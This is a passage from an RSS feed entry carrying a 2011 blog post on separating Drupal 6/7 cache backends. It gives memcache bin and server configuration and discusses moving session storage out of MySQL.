&lt;span class=&quot;x&quot;&gt;  // most other bin. Currently APC is managing it internally with request&amp;#39;s&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // $_SERVER[&amp;#39;PHP_HOST&amp;#39;]. &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Define Memcache settings.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  /* in case you use php-memcached and not php-memcache (for this one use php.ini settings)&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;memcache_options&amp;#39;] = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    Memcached::OPT_BINARY_PROTOCOL =&amp;gt; FALSE, // set TRUE to enable binary protocol when using memcached &amp;gt;= 1.4&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    Memcached::OPT_COMPRESSION =&amp;gt; FALSE, // set FALSE to disable compression for improved performance&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    Memcached::OPT_DISTRIBUTION =&amp;gt; Memcached::DISTRIBUTION_CONSISTENT, // set consistent distribution&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    Memcached::OPT_HASH =&amp;gt; Memcached::HASH_CRC, // set CRC32 hash method&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    Memcached::OPT_CONNECT_TIMEOUT =&amp;gt; 1000, // connection timeout in milliseconds&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    Memcached::OPT_SERVER_FAILURE_LIMIT =&amp;gt; 5, // failure limit for server connection attempts&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  );*/&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // This is not necessary if you have only 1 memcached server on default port&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // (11211) but could be used to map &amp;amp; replicate bins between several servers&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // (see memcached module documentation).&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;memcache_servers&amp;#39;] = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;127.0.0.1:11211&amp;#39; =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  );&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // comment cache bins not used with memcached&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;memcache_bins&amp;#39;] = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache&amp;#39;            =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    //&amp;#39;cache_bootstrap&amp;#39;  =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_block&amp;#39;      =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    //&amp;#39;cache_content&amp;#39;    =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    //&amp;#39;cache_filter&amp;#39;     =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    //&amp;#39;cache_form&amp;#39;       =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_menu&amp;#39;       =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_page&amp;#39;       =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_pathdst&amp;#39;    =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_pathsrc&amp;#39;    =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_uc_price&amp;#39;   =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    //&amp;#39;cache_update&amp;#39;     =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_users&amp;#39;      =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;cache_views&amp;#39;      =&amp;gt; &amp;#39;default&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    //&amp;#39;cache_views_data&amp;#39; =&amp;gt; &amp;#39;default&amp;#39;,    &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  );&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Define Drupal cache settings:&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Inactivate database connection if the cache backend doesn&amp;#39;t need it (for&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // cache_page bin only). If the page is not cached the db connection will be&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // made later.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;page_cache_without_database&amp;#39;] = TRUE;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Avoid executing very early hooks in case of page cached (like hook_boot).&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;page_cache_invoke_hooks&amp;#39;]     = TRUE;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Cached page lifetime.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;page_cache_maximum_age&amp;#39;]      = 3600;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Default lifetime for all cache entries (except form and page), if no&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // lifetime is specified by the module.&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $conf[&amp;#39;cache_lifetime&amp;#39;]              = 0;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;And the sessions?&lt;/h3&gt;

&lt;p&gt;We've just been removing write and read requests from MySQL.
But if you're tracking the request &amp;amp; locks usage in MySQL you will see that the main problem  is not really the cache backends, it's the session managmenent.
Session Management in MySQL implies a very huge number of write operations in the session table.
This single table is used in a very special way, no other table in the database is used with such read/write/delete ratio.
So by definition it's quite hard to perform some fine tunning on the MySQL server if this table is not removed.
To be honest statistics tracking can also make a lot of write requests,  but this is yet another problem&lt;/p&gt;

&lt;p&gt;The Cache Backend management is not responsible of the session storage (at least  by default).
Memcache module is providing a tool for that, Cache Router module  was announcing it as well.
But The use of a new Module called &lt;a href=&quot;http://drupal.org/sandbox/pounard/1263216&quot;&gt;Session Proxy&lt;/a&gt; should be the definitive solution,
allowing usage of a cache backend or usage of PHP native sessions (which can be set to memcache, mongodb, redis, etc.).
Today it's still a sandboxed  module, no official release. available only with Drupal7.&lt;/p&gt;

&lt;p&gt;More on this module when released (like how to manage session locks, how to configure the cache backend for sessions, etc).&lt;/p&gt;

&lt;p&gt;We could also talk about the lock API in Drupal (lock.inc), with a default implementation using MySQL.
Some modules provides lock alternatives which are faster (like the Redis module)...&lt;/p&gt;
</description>
				<published>2011-10-03 00:00:00 +0200</published>
				<link>http://regilero.github.io/drupal/english/2011/10/03/separate_cache_backends_d6_and_d7/</link>
			</item>
		
	</channel>
</rss>
